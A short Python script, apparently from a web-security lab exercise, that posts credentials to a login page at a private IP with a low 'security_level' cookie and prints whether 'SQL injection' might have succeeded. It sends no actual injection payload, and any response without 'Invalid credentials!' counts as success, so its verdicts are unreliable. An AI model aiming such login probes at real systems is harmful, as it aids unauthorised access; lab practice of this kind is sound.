#!/usr/bin/env python3

import requests

def build_request():
    """Constructs the URL, POST data, and headers."""
    url = 'http://10.10.129.100/login.php'
    data = {
        'login': 'admin',
        'password': 'pass',
        'form': 'submit'
    }
    headers = {
        'Host': '10.10.129.100',
        'User-Agent': 'CustomAgent/1.0',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': url,
        'Cookie': 'security_level=0; PHPSESSID=44aqofkmkgd4hta10956jfg0t2',
    }
    return url, data, headers

def send_post_request(url, data, headers):
    """Sends a single POST request."""
    try:
        response = requests.post(url, data=data, headers=headers)
        return response
    except requests.RequestException as e:
        print(f'[!] Request error: {e}')
        return None

def check_response(response):
    """Checks if the response indicates success or failure."""
    if response is None:
        print('[-] No response received.')
        return

    print(f'[+] HTTP Status Code: {response.status_code}')
    if 'Invalid credentials!' in response.text:
        print('[-] SQL injection failed or blocked.')
    else:
        print('[+] Unexpected response — potential SQL injection success.')

def main():
    url, data, headers = build_request()
    response = send_post_request(url, data, headers)
    check_response(response)

if __name__ == '__main__':
    main()
